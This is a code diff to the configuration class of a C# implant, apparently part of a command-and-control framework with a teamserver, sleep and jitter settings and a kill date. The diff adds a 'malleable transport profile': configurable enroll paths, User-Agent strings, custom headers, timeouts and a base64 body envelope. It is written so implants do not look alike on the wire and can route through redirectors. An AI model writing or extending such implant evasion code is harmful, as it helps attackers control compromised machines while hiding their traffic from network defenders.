@@ -61,8 +61,48 @@ internal sealed class Config
     /// </summary>
     public string CACertPath { get; set; } = string.Empty;
 
+    /// <summary>
+    /// The malleable transport profile applied to the enroll request
+    /// (architecture.md Sec 7, M4.3): the URI path, User-Agent, custom headers,
+    /// per-request timeout, and body envelope that shape the wire so two implants
+    /// do not look the same. Defaults leave the wire shape unchanged.
+    /// </summary>
+    public TransportProfile Transport { get; set; } = new();
+
     /// <summary>True when a kill date was supplied (env or flag or baked).</summary>
     public bool HasKillDate => KillDate != DateTimeOffset.MinValue;
+
+    /// <summary>
+    /// Composes the enroll host (EnrollURL with any path stripped) and the
+    /// transport profile's enroll path, so a profiled implant enrolls against the
+    /// path it was baked with rather than the teamserver's default route. Mirrors
+    /// the Go implant's Config.ResolvedEnrollURL.
+    /// </summary>
+    public string ResolvedEnrollURL()
+    {
+        var host = EnrollURL;
+        var path = Transport.EnrollPath;
+        if (path.Length == 0)
+            path = TransportProfile.DefaultEnrollPath;
+
+        // Drop the teamserver default enroll path from the configured URL so the
+        // profile's path replaces it cleanly.
+        const string defaultSuffix = "/implants/enroll";
+        if (host.EndsWith(defaultSuffix, StringComparison.OrdinalIgnoreCase))
+            host = host[..^defaultSuffix.Length];
+        // Strip any other trailing path on the host so the profile path appends
+        // exactly once.
+        var schemeIdx = host.IndexOf("://", StringComparison.Ordinal);
+        if (schemeIdx >= 0)
+        {
+            var rest = host[(schemeIdx + 3)..];
+            var slash = rest.IndexOf('/');
+            if (slash >= 0)
+                rest = rest[..slash];
+            host = host[..(schemeIdx + 3)] + rest;
+        }
+        return host + path;
+    }
 
     /// <summary>
     /// Builds a Config from command-line flags, falling back to the matching ROD_
@@ -80,6 +120,18 @@ internal sealed class Config
             Sleep = EnvTimeSpan("ROD_SLEEP", TimeSpan.FromSeconds(30)),
             Jitter = EnvTimeSpan("ROD_JITTER", TimeSpan.FromSeconds(10)),
             CACertPath = Env("ROD_CA_CERT", string.Empty),
+            // Malleable transport profile (architecture.md Sec 7, M4.3). Each knob
+            // falls back to the matching ROD_* env, then to a no-op default, so a
+            // profiled bake or an explicit flag changes the enroll wire shape and
+            // an un-profiled build stays unchanged.
+            Transport = new TransportProfile
+            {
+                EnrollPath = Env("ROD_ENROLL_PATH", string.Empty),
+                UserAgent = Env("ROD_USER_AGENT", string.Empty),
+                Envelope = Env("ROD_ENVELOPE", string.Empty),
+                RequestTimeout = EnvTimeSpan("ROD_REQUEST_TIMEOUT", TimeSpan.Zero),
+                Headers = ParseHeadersEnv(Env("ROD_HEADERS", string.Empty)),
+            },
         };
         var killDate = Env("ROD_KILL_DATE", string.Empty);
         if (killDate.Length > 0)
@@ -125,6 +177,22 @@ internal sealed class Config
                 case "--ca-cert":
                     config.CACertPath = TakeValue(args, ref i, flag);
                     break;
+                case "-enroll-path":
+                case "--enroll-path":
+                    config.Transport.EnrollPath = TakeValue(args, ref i, flag);
+                    break;
+                case "-user-agent":
+                case "--user-agent":
+                    config.Transport.UserAgent = TakeValue(args, ref i, flag);
+                    break;
+                case "-envelope":
+                case "--envelope":
+                    config.Transport.Envelope = TakeValue(args, ref i, flag);
+                    break;
+                case "-request-timeout":
+                case "--request-timeout":
+                    config.Transport.RequestTimeout = ParseGoDuration(TakeValue(args, ref i, flag), TimeSpan.Zero);
+                    break;
                 default:
                     throw new ExitProgramException(2, $"unknown flag: {flag}\n{Usage}");
             }
@@ -168,6 +236,34 @@ internal sealed class Config
     {
         var raw = Environment.GetEnvironmentVariable(key);
         return raw is { Length: > 0 } ? ParseGoDuration(raw, fallback) : fallback;
+    }
+
+    // Decodes the ROD_HEADERS value (a JSON object string, the same shape the
+    // baked profile's "headers" field carries) into a header map. An empty or
+    // malformed value yields an empty map so a bad bake never breaks enroll.
+    private static Dictionary<string, string> ParseHeadersEnv(string raw)
+    {
+        if (string.IsNullOrWhiteSpace(raw))
+            return new();
+        try
+        {
+            using var doc = System.Text.Json.JsonDocument.Parse(raw);
+            if (doc.RootElement.ValueKind != System.Text.Json.JsonValueKind.Object)
+                return new();
+            var headers = new Dictionary<string, string>();
+            foreach (var prop in doc.RootElement.EnumerateObject())
+            {
+                var value = prop.Value.ValueKind == System.Text.Json.JsonValueKind.String
+                    ? prop.Value.GetString() ?? string.Empty
+                    : prop.Value.GetRawText();
+                headers[prop.Name] = value;
+            }
+            return headers;
+        }
+        catch
+        {
+            return new();
+        }
     }
 
     // Returns the value for the flag at index i, advancing i past it. Throws a
@@ -275,6 +371,49 @@ internal sealed class Config
             throw new ExitProgramException(2, $"kill-date: cannot parse '{text}' as RFC3339");
         return date;
     }
+}
+
+/// <summary>
+/// The malleable wire-shape profile applied to the enroll request
+/// (architecture.md Sec 7, M4.3). Each knob is optional and defaults to a value
+/// that keeps the request identical to the un-profiled shape. Mirrors the Go
+/// implant's config.TransportProfile.
+/// </summary>
+internal sealed class TransportProfile
+{
+    /// <summary>
+    /// The teamserver's fixed enroll route, the value a profile fills in when it
+    /// does not override the path.
+    /// </summary>
+    public const string DefaultEnrollPath = "/implants/enroll";
+
+    /// <summary>The enroll timeout the reference implant used before the profile
+    /// carried its own.</summary>
+    public static readonly TimeSpan DefaultRequestTimeout = TimeSpan.FromSeconds(30);
+
+    /// <summary>
+    /// The URI path appended to the enroll host to form the enroll URL. Defaults
+    /// to <see cref="DefaultEnrollPath"/>. A profile may set it to a malleable
+    /// path a redirector rewrites (M4.4).
+    /// </summary>
+    public string EnrollPath { get; set; } = string.Empty;
+
+    /// <summary>The User-Agent header presented on enroll. Empty omits it.</summary>
+    public string UserAgent { get; set; } = string.Empty;
+
+    /// <summary>Extra HTTP headers applied to the enroll request. Empty adds none.</summary>
+    public Dictionary<string, string> Headers { get; set; } = new();
+
+    /// <summary>The per-request enroll timeout. Zero means the default (30s).</summary>
+    public TimeSpan RequestTimeout { get; set; }
+
+    /// <summary>How the enroll JSON body is shaped: "none" sends raw JSON, "base64"
+    /// wraps it as a single base64 string. Empty means none.</summary>
+    public string Envelope { get; set; } = string.Empty;
+
+    /// <summary>True when the envelope wraps the enroll body as base64.</summary>
+    public bool IsBase64Envelope =>
+        Envelope.Equals("base64", StringComparison.OrdinalIgnoreCase);
 }
 
 /// <summary>
